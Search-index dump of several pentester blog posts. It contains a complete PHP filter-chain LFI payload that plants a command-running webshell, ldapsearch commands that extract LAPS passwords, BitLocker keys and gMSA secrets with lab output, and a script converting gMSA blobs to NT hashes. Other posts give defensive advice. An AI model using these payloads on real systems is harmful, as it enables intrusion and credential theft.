[{"categories":null,"content":"Recently found an LFI in a PHP application and one of the cool things I learned about recently was PHP filter chains. More info here: https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html However, if you are using this in a URL, it’s pretty hard to do anything too complicated since it expands the text to the point where web servers won’t accept the URL anymore (8190 characters is default max in Apache). So I used this: \u003c?=`$_GET[0]`?\u003e From: https://github.com/bayufedra/Tiny-PHP-Webshell Which resulted in the following 3036 character URI ending in a \u00260=ls which executed the command ls: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp\u00260=ls This results in a in-memory (not sure if it writes to a temp file with php://temp) php webshell. ","date":"2023-04-16","objectID":"https://malicious.link/posts/2023/simple-php-webshell-with-php-filter-chains/:0:0","tags":["php","webshell","pentesting","lfi"],"title":"Simple PHP webshell with php filter chains","uri":"https://malicious.link/posts/2023/simple-php-webshell-with-php-filter-chains/"},{"categories":null,"content":"Lesson 4 - User Blaming Security is NOT everyone’s job in the company. Stop trying to force the issue. It’s security’s job to enable, incentivize and protect. In the Marine Corps, I was taught that every Marine is a “Rifleman”, meaning that any Marine, no matter their MOS (Military Occupational Specialty) - aka their job, could be called upon to engage with the enemy using a rifle or other weapon. This meant that every Marine must be trained, and regularly re-trained/tested, to ensure their proficiency with a rifle. Other branches have similar stances or sayings. I believe the mindset that every person in a company has a stake in it’s cyber security came from veterans. That or it came from the realm of safety, which I 100% support. Safety is everyone’s responsibility. Now is where some of you are equating cyber security with safety, and yes, they do sometimes overlap. However, in most cases, cyber security has nothing to do with the safety of a corporations personnel, customers, or it’s community. So what am I saying? 3 things: Stop blaming users for clicking on links, or opening macro enabled documents, or inserting USB sticks with viruses on them. We need to get to a place in security where it doesn’t matter if they do those things. We need to do better and stop making excuses. Security awareness training is usually overly complicated, outdated, or has very little other use. I think those teams are better served by running a security incentivize program. What does this look like? Basically a gamification of security asks. Start a points program at your company. Give points away for reporting phishing emails or security infractions like tailgaiting Give points monthly for use of a password manager Take away points based on security infractions (infected laptop, clicking a phishing email) Give points monthly of good password use. Give points for early adoption / beta testing of security programs Allow points to be spent on gift cards, dinners with the CISO / CEO / CTO, or live events like tickets to concerts or plays. Change how the security organization talks within and outside the organization about partners in IT, developers and users in general. Managers need to crack down on this type of negative talk because it can be easily felt on calls with those groups. Number 3 is super important. If you allow people to talk negatively about another group in your company it will quickly become the law of the land, and will decrease motivation to find equitable solutions or even have equitable conversations. At the end of the day, we, the security community and vendors have to do a better job at solving problems and rejecting solutions that just perpetuate the status quo. ","date":"2022-06-22","objectID":"https://malicious.link/posts/2022/beautiful-basics-lesson-04/:1:0","tags":["beautifulbasics","series"],"title":"Beautiful Basics: Lesson 4","uri":"https://malicious.link/posts/2022/beautiful-basics-lesson-04/"},{"categories":null,"content":"Lesson 3 - Detection Reality People and Honey tokens are THE BEST detective tool you have. Go buy a Thinkst Canary, they detect me more than any multi-million dollar EDR. Period. Let me clarify something quickly before I get roasted. I am not saying that EDR (Endpoint Detection and Response) agents don’t have a place, it’s just that they have taken over for Anti-Virus for being mostly preventative and response oriented. Do EDRs detect things? Sure, but in my pentesting and red teaming experience they rarely catch any of the actions I do outside of touching LSASS. Which to be fair, is what a lot of malware and APT actors do. But it won’t stay that way, and Sysmon is free :P One more clarifying statement. I have no affiliation to Thinkst other than knowing Haroon Meer through Twitter and meeting him once or twice in person, super amazing dude, I think the world of him. I truly think the Canary as a concept is one of the best detective tools we have. If you don’t have fake accounts, computers, and configurations that look vulnerable mixed in with your population of systems you are missing out. Finally lets get to the meat of this lesson. Back in 2018 I made this statement: Dear %Companies%, A single security minded Sys Admin is worth more than a handful of pentesters. Please start investing in the admins you already have. I say this as a pentester who has seen the impact that an empowered admin can have. — Rob Fuller (@mubix) June 14, 2018 System administrators usually know their systems very well. With the move to DevOps, I’m not sure if that is decreasing because systems are more transitory or the monitoring systems have kept pace or improved because of it. But, as a pentester / red teamer I have been caught more times by system administrators than any tool security operations has put in place. I did a talk back in 2014 called “Attacker Ghost Stories” [slides] about exactly this and all of the ways system administrators put tricks and traps in place to catch attackers like me. What are these tricks? Just to name a few: Trap: Create a domain administrator that has logon hours all turned off with alerting on any attempt to logon with that user not just sent to an alert or a log server but to PagerDuty. This user had the current, real password in the description. No one should EVER use this account. Benefit: It’s too hard to pass up and logon hours aren’t commonly looked at by attackers in the attributes for a user, so not only will the attack fail, you’ll have a near instant, high fidelity alert of malicious actions on your network. Alternatives: Have an account that is Kerberoastable with a very weak password that doesn’t have permission to logon anywhere (you can do this by assigning the user to a computer account that no longer exists). Less risk an attacker will find a way to use the account and still a high fidelity alert (just not as juicy of bait) Trap: A fake login portal that looks like it is a corporate VPN or OWA server, this is a very easy way to identify credentials that had already been stolen some other way from your organization. Benefit: An attacker will attempt to validate credentials they have stolen other ways. This is just two ideas. Go look at the slides for more, or check out OpenCanary - https://github.com/thinkst/opencanary - it’s an open source version that you can start to play with along with Canary Tokens if you want even less setup - https://canarytokens.org/generate You don’t have to use any of the Thinkst tools, for that matter you don’t need any of the new “Deception” vendors (** **barf** **) out there. Just sprinkle your network with bait of all kinds (ask your pentester, or look at what your last pentest report “found” as their steps) and make fake things. It’s set-it-and-forget-it. Way easier than implementing 500 security vendors to catch bad in every way possible. ","date":"2022-05-28","objectID":"https://malicious.link/posts/2022/beautiful-basics-lesson-03/:1:0","tags":["beautifulbasics","series"],"title":"Beautiful Basics: Lesson 3","uri":"https://malicious.link/posts/2022/beautiful-basics-lesson-03/"},{"categories":null,"content":"Update: 10/15/2022 One of the hard parts of implementing a block like this is the concern that it will “break something”. The DFIR Report’s post on Bumblebee Round 2 has a great suggestion on how to detect legitimate (and illegitimate) use of ISO mounting using Event ID 12 of the Microsoft-Windows-VHDMP-Operational logs. It’s not one of the main Application/System/Security logs so you may have to configure your forwarders to start capturing it, but it will give you a good idea of how common it is for your organization to mount ISOs. The following image is an example that I stole from the DFIR Report’s blog post. Update: 9/6/2022 First, I corrected the misspelling of ProgrammaticAccessOnly - thanks Josh! Second, I added SCSI\\CdRomMsft____Virtual_DVD-ROM_ into the blog post to make it easier to copy/paste Finally, if you are following the below process of blocking ISOs using the SCSI\\CdRomMsft____Virtual_DVD-ROM_ method, before you block you may want to double check how wide spread use of virtual ISO mounting is. You can do so via Event ID 6422. You can see if you have it enabled on a specific host using the following command: Using this GPO setting: Recently I’ve been hearing about malware mounting ISOs as a method of bypassing AV and EDR. For example this article from Bleeping Computer - “Uptick Seen in ISO Email Attachments Delivering Malware” posted December 23rd, 2019, or DARK Reading - “ChromeLoader Malware Hijacks Browsers with ISO Files” posted May 27th, 2022. The problem I found with these articles and many like it didn’t really offer any sort of method to protect yourself or you company from ISO mounted malware, so I went to try to find a solution myself (couldn’t be that hard right?). Turns out that if you google for “Stop Windows from Mounting ISOs” or something similar you get a bunch of MSDN articles for people trying to solve the same issue for one reason or another. After a lot of googling I found this article on Winaero - “Remove Mount Context Menu in Windows 10” posted April 5th 2018. This article shows how to add a simple registry key under HKEY_CLASSES_ROOT\\Windows.IsoFile\\shell\\mount called ProgrammaticAccessOnly which would remove the context menu item when you right clicked an ISO. It also removed the functionality of double clicking to auto-mount ISOs. Here is the tweet from May 4th, 2022 when I figured this out: For those that are dealing with ISO based malware downloads, might I suggest the following solution: https://t.co/2SHxqQFCTG Basically add \"ProgrammaticAccessOnly\" to HKEY_CLASSES_ROOT\\Windows.IsoFile\\shell\\mount as a REG_SZ This can be done at a GPO level :) — Rob Fuller (@mubix) May 4, 2022 This was great because you could put this into a Group Policy and make it so everyone was protected but administrators could still mount drives with PowerShell and the Mount-DiskImage command. I haven’t seen malware that downloads ISOs and executes whats in them programmatically after mounting them, but I have heard that this type of malware does exist, and the above protection won’t stop that type of malware use case. So I went digging again for a more holistic approach. After a lot of googling again, I found this post from NeighborGeek - “Error mounting ISO file - ‘Sorry, there was a problem mounting the file’” posted October 31st, 2017. In this post it described “Device Installation Restrictions” in Group Policy that were blocking ISOs from being mounted. I didn’t know how to make those settings but I found a great article on MSDN - “Manage Device installation with Group Policy” that showed me how. After playing around with it a bit I was able to block ISOs from being mounted by double click, by context menu, and programmatically through powershell with one simple GPO: For ease of copy paste: SCSI\\CdRomMsft____Virtual_DVD-ROM_ KEY TAKEAWAY: I would highly recommend this GPO on all of your workstations / laptops. Obviously servers need ISOs a lot more (not sure it’s all that common to mount an ISO directly","date":"2022-05-27","objectID":"https://malicious.link/posts/2022/blocking-iso-mounting/:0:0","tags":["defense","iso","prevention"],"title":"Blocking ISO mounting","uri":"https://malicious.link/posts/2022/blocking-iso-mounting/"},{"categories":null,"content":"ldapsearch is a extremely powerful tool, especially for Windows Active Directory enumeration. It’s one of my primary tools when performing pentesting or red teaming against an environment with Active Directory, but also comes in quiet handy to know as many times it can come default installed or part of a base image, so its a bit Living-Off-The-Land-esq. Another point towards ldapsearch is that it’s easy to forget that Active Directory isn’t the only LDAP server in most environments and the ability to utilize a tool like this can come in extremely handy. If you want to find Active Directory LDAP servers, use the following command: $ dig -t SRV _ldap._tcp.dc._msdcs.sittingduck.info ","date":"2022-05-14","objectID":"https://malicious.link/posts/2022/ldapsearch-reference/:0:0","tags":["ldap","ldapsearch","notes"],"title":"LDAPSearch Reference","uri":"https://malicious.link/posts/2022/ldapsearch-reference/"},{"categories":null,"content":"Basic Usage -x Basic Authentication, you usually use this if you are going to include a username and password (instead of something like a kerberos ticket) -h IP address or hostname -H URL to force protocol and/or add port number -H ldaps://dc1.b.com or -H ldaps://dc1.b.com:6636 (636 is the default port for LDAPS, but can be connected to on 389 and is sometimes found with an additional 6 in the front as shown). 3269 is the Global Catalog port and can also accept LDAPS queries sometimes (you may have to ignore cert errors for this to work, depending on your setup). -b Base, generally this is Distinguished Name format for example dc=google,dc=com -D Username and Domain (not FQDN) \"sittingduck\\uberuser\". For maximum Kerberos based authentication you can also specify your user in uberuser@SITTINGDUCK.INFO form, but ldapsearch will auto user the current user in Kerberos tickets available, so this can be omitted -LLL This removes all of the extra log output of the search -Y GSSAPI Used for Kerberos based authentication, however this is on by default and not needed (if installed), but you can specify it just to test to see if SASL is installed. apt install libsasl2-modules-gssapi-mit if it isn’t. Once installed, you do not need to keep this on the command line. -E is for extended controls which are generally OIDs, but can also be: -E pr=1000/noprompt By default ldapsearch will pull 1000 records maximum. Adding this it will pull 1000 records at a time until it has printed all results to the screen. -O minssf=0,maxssf=0 This option will fix some errors during SASL (Kerberos) authentication. Technically this shouldn’t do anything based on the RFC, but it’s essentially telling the LDAP protocol that there isn’t a min or a max size for the authentication packets. -o ldif-wrap=no This options makes the output non-wrapped, which is the best format to pull out things like certificates and other very long strings. -W and -w - -W will prompt for the password, with -w you can specify the password on the command line. If you do not specify one of these ldapsearch will assume no password for the account. You can lock accounts out this way. LDAPTLS_REQCERT=never ldapsearch {arguments} This is used when you are connecting to a self signed, or SSL enabled LDAP that your system cannot verify the certificate for. -N Do not try to have the host name of your target DC attempted to perform a reverse DNS on the IP to match them. This is needed when the Domain Controller doesn’t have a valid reverse DNS record from your standpoint on the network and you are using Kerberos. ","date":"2022-05-14","objectID":"https://malicious.link/posts/2022/ldapsearch-reference/:0:1","tags":["ldap","ldapsearch","notes"],"title":"LDAPSearch Reference","uri":"https://malicious.link/posts/2022/ldapsearch-reference/"},{"categories":null,"content":"LDAP Search Filters After the arguments comes the filter, then the attributes. Filters are like search terms. For example \"(ms-Mcs-AdmPwdExpirationTtime=*)\" is a search that says if the LDAP object has the ms-Mcs-AdmPwdExpirationTtime attribute and it’s not empty. LDAP filters are a bit odd, as they need to be within parentheses completely. In order to do a search for x AND y you have to do something like this (\u0026(x=*)(y=*)). This search says only return results that have x and y and both are not empty. Here is a real world example: \"(\u0026(\u0026(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))\" This says all objects that have servicesPrincipalName attributes, it is a normal account (512) see more here AND is NOT ! disabled (2). Note: 1.2.840.113556.1.4.803 is an LDAP feature that says LDAP_MATCHING_RULE_BIT_AND which is basically a bitwise AND. For example, a standard user account is 512 but would be 514 if disabled, but a computer account is 4096 and 4098 if disabled. Used the bitwise function you can account for both scenarios since it’s looking in the 2 binary location. Everything after the filter is selection of attributes. (also known as “parameters” if you are used to Powershell and AD Objects) ","date":"2022-05-14","objectID":"https://malicious.link/posts/2022/ldapsearch-reference/:0:2","tags":["ldap","ldapsearch","notes"],"title":"LDAPSearch Reference","uri":"https://malicious.link/posts/2022/ldapsearch-reference/"},{"categories":null,"content":"Interesting Attributes msDS-Approx-Immed-Subordinates - Gives you a count of objects directly below the specified “Base” -b NTSecurityDescriptor - This is the SDSF in binary and base64 format, and will only be displayed if you request it specifically for the object. msDS-ManagedPassword - This is a at-runtime built attribute that is the current NT hash of the Group Managed Service Account GMSA. !WARNING! See below before querying. msFVE-RecoveryPassword - This is also an at-runtine built attribute that is the current BitLocker secret key for the computer account you query. !WARNING! See below before querying. ","date":"2022-05-14","objectID":"https://malicious.link/posts/2022/ldapsearch-reference/:0:3","tags":["ldap","ldapsearch","notes"],"title":"LDAPSearch Reference","uri":"https://malicious.link/posts/2022/ldapsearch-reference/"},{"categories":null,"content":"Null Session Starting This can be done without any authentication and will give you a ton of information about the LDAP server in question (usually Active Directory): $ ldapsearch -h 192.168.80.100 -x -b \"\" -s base \\* + Example Output # extended LDIF # # LDAPv3 # base \u003c\u003e with scope baseObject # filter: (objectclass=*) # requesting: * + # # dn: currentTime: 20220513212748.0Z subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=sittingduck,DC=i nfo dsServiceName: CN=NTDS Settings,CN=DC2,CN=Servers,CN=Default-First-Site-Name,C N=Sites,CN=Configuration,DC=sittingduck,DC=info namingContexts: DC=sittingduck,DC=info namingContexts: CN=Configuration,DC=sittingduck,DC=info namingContexts: CN=Schema,CN=Configuration,DC=sittingduck,DC=info namingContexts: DC=DomainDnsZones,DC=sittingduck,DC=info namingContexts: DC=ForestDnsZones,DC=sittingduck,DC=info defaultNamingContext: DC=sittingduck,DC=info schemaNamingContext: CN=Schema,CN=Configuration,DC=sittingduck,DC=info configurationNamingContext: CN=Configuration,DC=sittingduck,DC=info rootDomainNamingContext: DC=sittingduck,DC=info supportedControl: 1.2.840.113556.1.4.319 supportedControl: 1.2.840.113556.1.4.801 supportedControl: 1.2.840.113556.1.4.473 supportedControl: 1.2.840.113556.1.4.528 supportedControl: 1.2.840.113556.1.4.417 supportedControl: 1.2.840.113556.1.4.619 supportedControl: 1.2.840.113556.1.4.841 supportedControl: 1.2.840.113556.1.4.529 supportedControl: 1.2.840.113556.1.4.805 supportedControl: 1.2.840.113556.1.4.521 supportedControl: 1.2.840.113556.1.4.970 supportedControl: 1.2.840.113556.1.4.1338 supportedControl: 1.2.840.113556.1.4.474 supportedControl: 1.2.840.113556.1.4.1339 supportedControl: 1.2.840.113556.1.4.1340 supportedControl: 1.2.840.113556.1.4.1413 supportedControl: 2.16.840.1.113730.3.4.9 supportedControl: 2.16.840.1.113730.3.4.10 supportedControl: 1.2.840.113556.1.4.1504 supportedControl: 1.2.840.113556.1.4.1852 supportedControl: 1.2.840.113556.1.4.802 supportedControl: 1.2.840.113556.1.4.1907 supportedControl: 1.2.840.113556.1.4.1948 supportedControl: 1.2.840.113556.1.4.1974 supportedControl: 1.2.840.113556.1.4.1341 supportedControl: 1.2.840.113556.1.4.2026 supportedControl: 1.2.840.113556.1.4.2064 supportedControl: 1.2.840.113556.1.4.2065 supportedControl: 1.2.840.113556.1.4.2066 supportedControl: 1.2.840.113556.1.4.2090 supportedControl: 1.2.840.113556.1.4.2205 supportedControl: 1.2.840.113556.1.4.2204 supportedControl: 1.2.840.113556.1.4.2206 supportedControl: 1.2.840.113556.1.4.2211 supportedControl: 1.2.840.113556.1.4.2239 supportedControl: 1.2.840.113556.1.4.2255 supportedControl: 1.2.840.113556.1.4.2256 supportedLDAPVersion: 3 supportedLDAPVersion: 2 supportedLDAPPolicies: MaxPoolThreads supportedLDAPPolicies: MaxPercentDirSyncRequests supportedLDAPPolicies: MaxDatagramRecv supportedLDAPPolicies: MaxReceiveBuffer supportedLDAPPolicies: InitRecvTimeout supportedLDAPPolicies: MaxConnections supportedLDAPPolicies: MaxConnIdleTime supportedLDAPPolicies: MaxPageSize supportedLDAPPolicies: MaxBatchReturnMessages supportedLDAPPolicies: MaxQueryDuration supportedLDAPPolicies: MaxTempTableSize supportedLDAPPolicies: MaxResultSetSize supportedLDAPPolicies: MinResultSets supportedLDAPPolicies: MaxResultSetsPerConn supportedLDAPPolicies: MaxNotificationPerConn supportedLDAPPolicies: MaxValRange supportedLDAPPolicies: MaxValRangeTransitive supportedLDAPPolicies: ThreadMemoryLimit supportedLDAPPolicies: SystemMemoryLimitPercent highestCommittedUSN: 2830648 supportedSASLMechanisms: GSSAPI supportedSASLMechanisms: GSS-SPNEGO supportedSASLMechanisms: EXTERNAL supportedSASLMechanisms: DIGEST-MD5 dnsHostName: dc2.sittingduck.info ldapServiceName: sittingduck.info:dc2$@SITTINGDUCK.INFO serverName: CN=DC2,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configura tion,DC=sittingduck,DC=info supportedCapabilities: 1.2.840.113556.1.4.800 supportedCapabilities: 1.2.840.113556.1.4.1670 supportedCapabilities: 1.2.840.113556.1.4.1791 supportedCapabilities: 1.2.840.11","date":"2022-05-14","objectID":"https://malicious.link/posts/2022/ldapsearch-reference/:0:4","tags":["ldap","ldapsearch","notes"],"title":"LDAPSearch Reference","uri":"https://malicious.link/posts/2022/ldapsearch-reference/"},{"categories":null,"content":"Interesting Searches The following are searches that I’ve found interesting or impactful in my experience. ","date":"2022-05-14","objectID":"https://malicious.link/posts/2022/ldapsearch-reference/:1:0","tags":["ldap","ldapsearch","notes"],"title":"LDAPSearch Reference","uri":"https://malicious.link/posts/2022/ldapsearch-reference/"},{"categories":null,"content":"LAPs Passwords This search will only show computers with LAPs enabled, and if you can read any passwords, what the password currently is. Notice that this user can read every password except SDLEGACY2K3 and SDEXCHANGE $ ldapsearch -LLL -h 192.168.80.10 -b \"dc=sittingduck,dc=info\" -x -D \"sittingduck\\uberuser\" -w \"ASDqwe123\" '(ms-Mcs-AdmPwdExpirationtime=*)' ms-Mcs-AdmPwd dn: CN=DC1,OU=Domain Controllers,DC=sittingduck,DC=info ms-Mcs-AdmPwd: f/0HG3)7d5P+e;/IE5wW8I/o//5)}W dn: CN=SDCLIENT_DAWIN7,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info ms-Mcs-AdmPwd: /B+%R26cVSA1c0zOi[-Z/#n1Q2sA,, dn: CN=SDLEGACY2K3,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info dn: CN=SD_WSUS_2012,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info ms-Mcs-AdmPwd: }b+BC@p,7))6pqxj3y]MxBm9@h9Hy- dn: CN=SDEXCHANGE,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info dn: CN=WIN-PM0ID6F0AHN,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info ms-Mcs-AdmPwd: ]]3-%AN574#{/%t55!S+0!/10OJC;V dn: CN=DC2,OU=Domain Controllers,DC=sittingduck,DC=info ms-Mcs-AdmPwd: kMo,85{N(uhUmWj183,3#T\u0026d[Aeddv ","date":"2022-05-14","objectID":"https://malicious.link/posts/2022/ldapsearch-reference/:1:1","tags":["ldap","ldapsearch","notes"],"title":"LDAPSearch Reference","uri":"https://malicious.link/posts/2022/ldapsearch-reference/"},{"categories":null,"content":"BitLocker Recovery Passwords src: https://stackoverflow.com/a/50833203 The key on this one is narrowing down the search base to a small list or a single computer. The reason this is important is that the Domain Controller you are asking the password from has to do a bunch of decryption to calculate this attribute on the fly, if you ask for too many (like every machine in the Domain) the connection will be closed out due to timeout. Don’t be greedy, just get the one you need. $ ldapsearch -h dc1.sittingduck.info -b \"CN=WIN10COMP1,OU=Workstations,DC=sittingduck,DC=info\" msfve-recoverypassword ","date":"2022-05-14","objectID":"https://malicious.link/posts/2022/ldapsearch-reference/:1:2","tags":["ldap","ldapsearch","notes"],"title":"LDAPSearch Reference","uri":"https://malicious.link/posts/2022/ldapsearch-reference/"},{"categories":null,"content":"GMSA NT Hash src: https://stealthbits.com/blog/securing-gmsa-passwords/ src: https://github.com/SecureAuthCorp/impacket/pull/770 Group Managed Service Accounts (GMSA) have randomly generated passwords that are default/generally pretty long. The msDS-ManagedPassword in an at-runtime decrypted value that the Domain Controller has to construct in order to return, much like the BitLocker keys. However, unlike with BitLocker, generally there aren’t very many GMSAs so it’s less of a chance to knock over the DC if you get greedy and query them all. $ LDAPTLS_REQCERT=never ldapsearch -LLL -H ldaps://192.168.80.10 -x -D uberuser -w ASDqwe123 -o ldif-wrap=no -b 'dc=sittingduck,dc=info' '(\u0026(ObjectClass=msDS-GroupManagedServiceAccount))' msDS-ManagedPassword dn: CN=TestGMSA,CN=Managed Service Accounts,DC=sittingduck,DC=info msDS-ManagedPassword:: AQAAACQCAAAQABIBFAIcAq/tlcA3PziSdtjxwKwcpM9VAteZa9No6et8yDWzgEYj5yFDhzT0OMFtTA4qAI4M+sWjiUVqYhDwFItW+5FlhaJp8tm/fcAfIDc5MAsYOXgq3AIc6ofCpeJga6Jw4SX/EKmnQdsS7lGmXd/yh27qJGj6SS0vwk//D8cr1+6s43YB0TxUxyLrruupZmd4Ndx2PZ4L4zkWa/vlRlDzadyeGwji70q9sfjH5x7+l7V+w5JK7/hKfG48swD8koEK/bHyLxZa8eDMEoscAmnuC/CA/pTvdF6jfIYmAYMGZujOVkbXJjaCEPGA1+nBDqkOQ1NlLZu4Y6Es1bB3YVIv6agDICYAAJ3USvAd5t267x9PfdetWSfLGRt4qxMCmOwXO0nVWMJTSYfjC+Phc0QX/rrTimPptYvx2NnuAclbgj0Fvg0iZfOvHW0SwdKTyKCvGeL+UPz4Jwr2VAd+PX43GoUPD8uBhDrtzVSwUhtScDIvzGJYgvHrREnTUqaf9pENqkVpbdXHtpE/buIphVrPEg84e9fgNB2a/r6sZaPX+1C8e/5pbNO7qoQ4fqXSDPM3qh6ymlh2ouNRoP0kN4sLVUvW+cNX+YQk7UJDSnG3fANPtgquhi6B4OVqU2fpypUbFtd91Ju/9xZeuod508FqYHPT1aX86tBdLj4yq2/65ROupERLVhAAADPE7gxzEgAAM2YeWnISAAA= Once you have this blob of text, you need to convert it into the NT hash using this tool: (this is a slightly modified version of the script that agsolino posted) #!/usr/bin/env python3 from impacket.structure import hexdump, Structure import base64 import sys, getopt # Source from: https://github.com/SecureAuthCorp/impacket/pull/770#issuecomment-589243865 class MSDS_MANAGEDPASSWORD_BLOB(Structure): structure = ( ('Version','\u003cH'), ('Reserved','\u003cH'), ('Length','\u003cL'), ('CurrentPasswordOffset','\u003cH'), ('PreviousPasswordOffset','\u003cH'), ('QueryPasswordIntervalOffset','\u003cH'), ('UnchangedPasswordIntervalOffset','\u003cH'), ('CurrentPassword',':'), ('PreviousPassword',':'), #('AlignmentPadding',':'), ('QueryPasswordInterval',':'), ('UnchangedPasswordInterval',':'), ) def __init__(self, data = None): Structure.__init__(self, data = data) def fromString(self, data): Structure.fromString(self,data) if self['PreviousPasswordOffset'] == 0: endData = self['QueryPasswordIntervalOffset'] else: endData = self['PreviousPasswordOffset'] self['CurrentPassword'] = self.rawData[self['CurrentPasswordOffset']:][:endData - self['CurrentPasswordOffset']] if self['PreviousPasswordOffset'] != 0: self['PreviousPassword'] = self.rawData[self['PreviousPasswordOffset']:][:self['QueryPasswordIntervalOffset']-self['PreviousPasswordOffset']] self['QueryPasswordInterval'] = self.rawData[self['QueryPasswordIntervalOffset']:][:self['UnchangedPasswordIntervalOffset']-self['QueryPasswordIntervalOffset']] self['UnchangedPasswordInterval'] = self.rawData[self['UnchangedPasswordIntervalOffset']:] def main(argv): b64 = \"\" verbose = False try: opts, args = getopt.getopt(argv,\"hvb:\",[\"base64=\"]) except getopt.GetoptError: print ('gmsa.py -b \u003cmsDS-ManagedPassword base64\u003e -v (optional verbose)') sys.exit(2) for opt, arg in opts: if opt == '-h': print ('gmsa.py -b \u003cmsDS-ManagedPassword base64\u003e -v (optional verbose)') sys.exit() elif opt in (\"-v\"): verbose = True elif opt in (\"-b\", \"--base64\"): b64 = arg if b64 == \"\": print ('gmsa.py -b \u003cmsDS-ManagedPassword base64\u003e -v (optional verbose)') sys.exit() test = base64.b64decode(b64) blob = MSDS_MANAGEDPASSWORD_BLOB() blob.fromString(test) if verbose == True: blob.dump() print(\"=\"*80) print(\"Cleartext Password\") hexdump(blob['CurrentPassword'][:-2]) from Cryptodome.Hash import MD4 hash = MD4.new () hash.update (blob['CurrentPassword'][:-2]) print(\"=\"*80) print(\"NTHash: {}\".format(hash.hexd","date":"2022-05-14","objectID":"https://malicious.link/posts/2022/ldapsearch-reference/:1:3","tags":["ldap","ldapsearch","notes"],"title":"LDAPSearch Reference","uri":"https://malicious.link/posts/2022/ldapsearch-reference/"},{"categories":null,"content":"Certificate Authorities and Templates This is a list of certificate templates that are enabled on each certificate authority in the domain. $ ldapsearch -LLL -b \"CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=sittingduck,DC=info\" -h 192.168.80.10 -w \"ASDqwe123\" -D \"uberuser\" certificateTemplates dn: CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration ,DC=sittingduck,DC=info dn: CN=sittingduck-W2KCA-CA,CN=Enrollment Services,CN=Public Key Services,CN=S ervices,CN=Configuration,DC=sittingduck,DC=info certificateTemplates: ExchangeUser certificateTemplates: ExchangeUserSignature certificateTemplates: EnrollmentAgentOffline certificateTemplates: MachineEnrollmentAgent certificateTemplates: EnrollmentAgent certificateTemplates: CrossCA certificateTemplates: CodeSigning certificateTemplates: CEPEncryption certificateTemplates: CAExchange certificateTemplates: ClientAuth certificateTemplates: Workstation certificateTemplates: UserSignature certificateTemplates: CTLSigning certificateTemplates: SmartcardUser certificateTemplates: SmartcardLogon certificateTemplates: OfflineRouter certificateTemplates: RASAndIASServer certificateTemplates: OCSPResponseSigning certificateTemplates: KeyRecoveryAgent certificateTemplates: IPSECIntermediateOffline certificateTemplates: IPSECIntermediateOnline certificateTemplates: 